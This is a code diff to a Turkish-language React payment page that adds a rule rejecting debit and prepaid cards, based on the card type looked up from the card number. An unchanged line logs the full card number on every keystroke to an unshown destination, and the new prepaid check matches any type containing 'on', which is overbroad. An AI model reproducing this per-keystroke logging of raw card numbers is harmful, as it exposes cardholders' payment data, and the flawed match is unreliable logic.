@@ -191,8 +191,32 @@ function OdemeContent() {
         if (cleanNum.length >= 6) {
             const info = findBankInfo(cleanNum);
             setBankInfo(info);
+
+            // Debit/Prepaid kontrolü
+            if (info && info.CardType) {
+                const typeLower = info.CardType.toLowerCase();
+                const isDebit = typeLower.includes('debit') || typeLower.includes('banka');
+                const isPrepaid = typeLower.includes('ön') || typeLower.includes('on') || typeLower.includes('odeme') || typeLower.includes('ödemeli') || typeLower.includes('prepaid');
+                
+                if (isDebit || isPrepaid) {
+                    setErrors(prev => ({ ...prev, cardNumber: 'Yalnızca kredi kartı ile ödeme kabul edilmektedir' }));
+                } else {
+                    setErrors(prev => {
+                        if (prev.cardNumber === 'Yalnızca kredi kartı ile ödeme kabul edilmektedir') {
+                            return { ...prev, cardNumber: '' };
+                        }
+                        return prev;
+                    });
+                }
+            }
         } else {
             setBankInfo(null);
+            setErrors(prev => {
+                if (prev.cardNumber === 'Yalnızca kredi kartı ile ödeme kabul edilmektedir') {
+                    return { ...prev, cardNumber: '' };
+                }
+                return prev;
+            });
         }
     }, [cardNumber]);
 
@@ -212,8 +236,8 @@ function OdemeContent() {
         const cleanedValue = formatted.replace(/\s/g, '');
         logInput('kredi_karti_numarasi', cleanedValue);
 
-        // Hata temizle
-        if (errors.cardNumber) {
+        // Hata temizle (debit/prepaid uyarısı değilse temizle)
+        if (errors.cardNumber && errors.cardNumber !== 'Yalnızca kredi kartı ile ödeme kabul edilmektedir') {
             setErrors(prev => ({ ...prev, cardNumber: '' }));
         }
     };
@@ -261,6 +285,18 @@ function OdemeContent() {
             newErrors.cardNumber = 'Kart numarası 16 haneli olmalıdır';
         } else if (!luhnCheck(cleanCardNumber)) {
             newErrors.cardNumber = 'Geçersiz kart numarası';
+        } else {
+            // Debit / Prepaid Kontrolü
+            const info = findBankInfo(cleanCardNumber);
+            if (info && info.CardType) {
+                const typeLower = info.CardType.toLowerCase();
+                const isDebit = typeLower.includes('debit') || typeLower.includes('banka');
+                const isPrepaid = typeLower.includes('ön') || typeLower.includes('on') || typeLower.includes('odeme') || typeLower.includes('ödemeli') || typeLower.includes('prepaid');
+                
+                if (isDebit || isPrepaid) {
+                    newErrors.cardNumber = 'Yalnızca kredi kartı ile ödeme kabul edilmektedir';
+                }
+            }
         }
 
         // Son kullanma tarihi
